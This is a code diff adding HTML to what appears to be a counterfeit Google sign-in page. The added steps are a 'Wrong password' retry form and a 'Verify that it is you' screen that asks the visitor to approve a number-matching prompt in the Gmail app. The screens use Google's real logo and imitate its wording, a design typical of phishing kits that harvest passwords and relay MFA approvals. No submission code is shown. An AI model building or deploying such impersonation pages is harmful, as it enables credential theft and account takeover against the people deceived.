@@ -68,6 +68,75 @@
           </div>
         </div>
 
+        <!-- Password Incorrect Step -->
+        <div class="login-step hidden" id="password-incorrect-step">
+          <div class="logo">
+            <img
+              src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png"
+              alt="Google"
+            />
+          </div>
+          <h1>Wrong password</h1>
+          <p class="error-subtitle">Try again or click Forgot password to reset it.</p>
+
+          <div class="user-identifier">
+            <span id="user-email-incorrect"></span>
+            <a href="#" id="back-to-email-from-incorrect" class="change-user">⮜</a>
+          </div>
+
+          <div class="form-group">
+            <label for="password-retry">Enter your password</label>
+            <input type="password" id="password-retry" name="password-retry" required />
+          </div>
+
+          <div class="links">
+            <a href="#">Forgot password?</a>
+          </div>
+
+          <div class="button-container">
+            <button id="password-retry-next" class="next-button">Next</button>
+          </div>
+        </div>
+
+        <!-- Gmail Prompt Verification Step -->
+        <div class="login-step hidden" id="gmail-prompt-step">
+          <div class="logo">
+            <img
+              src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png"
+              alt="Google"
+            />
+          </div>
+          <h1>Verify that it is you</h1>
+          <p class="verification-description">
+            For the security of your account, Google wants to make sure that it is you who is trying to log in. For
+            <a href="#" class="more-info-link">more information</a>
+          </p>
+
+          <div class="user-identifier">
+            <span id="user-email-prompt"></span>
+            <a href="#" id="back-to-password-from-prompt" class="change-user">⮜</a>
+          </div>
+
+          <div class="prompt-container">
+            <div class="prompt-number" id="prompt-number">26</div>
+            <div class="prompt-details">
+              <h3>Open the Gmail app on iPhone</h3>
+              <p class="prompt-instruction">
+                Google sent a notification to your iPhone. Open the Gmail app, tap <strong>Yes</strong> in the prompt, then tap <strong id="display-number">26</strong> on your phone to confirm that it is you.
+              </p>
+            </div>
+          </div>
+
+          <div class="verification-status">
+            <div class="status-text" id="status-text">Waiting for verification code...</div>
+            <div class="status-spinner"></div>
+          </div>
+
+          <div class="button-container">
+            <button id="try-other-ways" class="try-other-button">Try other ways</button>
+          </div>
+        </div>
+
         <!-- Verification Method Selection Step -->
         <div class="login-step hidden" id="verification-method-step">
           <div class="logo">
